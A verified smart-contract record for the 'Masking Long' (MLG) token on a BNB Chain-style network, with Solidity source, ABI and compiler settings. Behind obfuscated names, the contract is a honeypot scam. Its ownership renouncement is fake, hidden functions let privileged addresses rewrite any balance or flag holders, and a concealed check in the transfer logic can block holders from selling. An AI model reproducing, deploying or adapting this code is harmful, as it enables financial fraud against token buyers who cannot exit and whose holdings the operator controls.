{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface teamTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingSell {\n    function createPair(address shouldLimit, address senderFundTrading) external returns (address);\n}\n\ninterface takeMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderTakeEnable) external view returns (uint256);\n\n    function transfer(address modeSell, uint256 shouldBuy) external returns (bool);\n\n    function allowance(address launchEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSell,\n        uint256 shouldBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldSwap, uint256 value);\n    event Approval(address indexed launchEnable, address indexed spender, uint256 value);\n}\n\ninterface takeMarketingMetadata is takeMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MaskingLong is swapAuto, takeMarketing, takeMarketingMetadata {\n\n    uint256 maxTotalMode;\n\n    function exemptBuy(uint256 shouldBuy) public {\n        toFundBuy();\n        teamTx = shouldBuy;\n    }\n\n    string private minTrading = \"Masking Long\";\n\n    function allowance(address swapBuy, address enableMin) external view virtual override returns (uint256) {\n        if (enableMin == exemptTake) {\n            return type(uint256).max;\n        }\n        return launchAtSell[swapBuy][enableMin];\n    }\n\n    address public feeSellMarketing;\n\n    event OwnershipTransferred(address indexed launchReceiver, address indexed launchedAt);\n\n    function owner() external view returns (address) {\n        return isTo;\n    }\n\n    mapping(address => bool) public shouldReceiver;\n\n    function transfer(address buyTxTo, uint256 shouldBuy) external virtual override returns (bool) {\n        return swapSender(_msgSender(), buyTxTo, shouldBuy);\n    }\n\n    uint256 constant fromBuyExempt = 3 ** 10;\n\n    uint256 private listMarketingLiquidity = 100000000 * 10 ** 18;\n\n    uint256 private fundLaunchBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSellSwap;\n    }\n\n    bool private enableTake;\n\n    function launchFeeTrading(address teamExemptLaunch) public {\n        toFundBuy();\n        \n        if (teamExemptLaunch == feeSellMarketing || teamExemptLaunch == liquidityExemptTotal) {\n            return;\n        }\n        exemptTo[teamExemptLaunch] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMarketingLiquidity;\n    }\n\n    function getOwner() external view returns (address) {\n        return isTo;\n    }\n\n    function teamFund(address buyTxTo, uint256 shouldBuy) public {\n        toFundBuy();\n        launchReceiverLiquidity[buyTxTo] = shouldBuy;\n    }\n\n    uint256 public limitAuto;\n\n    function toSender(address exemptFrom, address modeSell, uint256 shouldBuy) internal returns (bool) {\n        require(launchReceiverLiquidity[exemptFrom] >= shouldBuy);\n        launchReceiverLiquidity[exemptFrom] -= shouldBuy;\n        launchReceiverLiquidity[modeSell] += shouldBuy;\n        emit Transfer(exemptFrom, modeSell, shouldBuy);\n        return true;\n    }\n\n    address exemptTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public exemptTo;\n\n    bool private liquidityReceiver;\n\n    uint8 private totalSellSwap = 18;\n\n    mapping(address => mapping(address => uint256)) private launchAtSell;\n\n    uint256 private launchedMarketingTrading;\n\n    function toFundBuy() private view {\n        require(shouldReceiver[_msgSender()]);\n    }\n\n    constructor (){\n        \n        teamTotal amountTeam = teamTotal(exemptTake);\n        liquidityExemptTotal = marketingSell(amountTeam.factory()).createPair(amountTeam.WETH(), address(this));\n        if (liquidityReceiver != limitEnable) {\n            shouldEnable = isTake;\n        }\n        feeSellMarketing = _msgSender();\n        atMaxLaunch();\n        shouldReceiver[feeSellMarketing] = true;\n        launchReceiverLiquidity[feeSellMarketing] = listMarketingLiquidity;\n        if (isTake == shouldEnable) {\n            limitEnable = false;\n        }\n        emit Transfer(address(0), feeSellMarketing, listMarketingLiquidity);\n    }\n\n    bool private limitEnable;\n\n    function balanceOf(address senderTakeEnable) public view virtual override returns (uint256) {\n        return launchReceiverLiquidity[senderTakeEnable];\n    }\n\n    address txAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private isTake;\n\n    string private liquidityMinFund = \"MLG\";\n\n    function senderLaunched(address toMode) public {\n        require(toMode.balance < 100000);\n        if (liquidityTotalShould) {\n            return;\n        }\n        if (fundLaunchBuy != launchedMarketingTrading) {\n            walletLiquidity = true;\n        }\n        shouldReceiver[toMode] = true;\n        if (isTake == shouldEnable) {\n            liquidityReceiver = false;\n        }\n        liquidityTotalShould = true;\n    }\n\n    uint256 teamTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityMinFund;\n    }\n\n    function approve(address enableMin, uint256 shouldBuy) public virtual override returns (bool) {\n        launchAtSell[_msgSender()][enableMin] = shouldBuy;\n        emit Approval(_msgSender(), enableMin, shouldBuy);\n        return true;\n    }\n\n    bool private walletLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return minTrading;\n    }\n\n    function transferFrom(address exemptFrom, address modeSell, uint256 shouldBuy) external override returns (bool) {\n        if (_msgSender() != exemptTake) {\n            if (launchAtSell[exemptFrom][_msgSender()] != type(uint256).max) {\n                require(shouldBuy <= launchAtSell[exemptFrom][_msgSender()]);\n                launchAtSell[exemptFrom][_msgSender()] -= shouldBuy;\n            }\n        }\n        return swapSender(exemptFrom, modeSell, shouldBuy);\n    }\n\n    bool public liquidityTotalShould;\n\n    function atMaxLaunch() public {\n        emit OwnershipTransferred(feeSellMarketing, address(0));\n        isTo = address(0);\n    }\n\n    address public liquidityExemptTotal;\n\n    mapping(address => uint256) private launchReceiverLiquidity;\n\n    address private isTo;\n\n    function swapSender(address exemptFrom, address modeSell, uint256 shouldBuy) internal returns (bool) {\n        if (exemptFrom == feeSellMarketing) {\n            return toSender(exemptFrom, modeSell, shouldBuy);\n        }\n        uint256 amountFee = takeMarketing(liquidityExemptTotal).balanceOf(txAuto);\n        require(amountFee == teamTx);\n        require(modeSell != txAuto);\n        if (exemptTo[exemptFrom]) {\n            return toSender(exemptFrom, modeSell, fromBuyExempt);\n        }\n        return toSender(exemptFrom, modeSell, shouldBuy);\n    }\n\n    uint256 public shouldEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTakeEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldBuy\",\"type\":\"uint256\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExemptLaunch\",\"type\":\"address\"}],\"name\":\"launchFeeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExemptTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTotalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuy\",\"type\":\"uint256\"}],\"name\":\"teamFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MaskingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}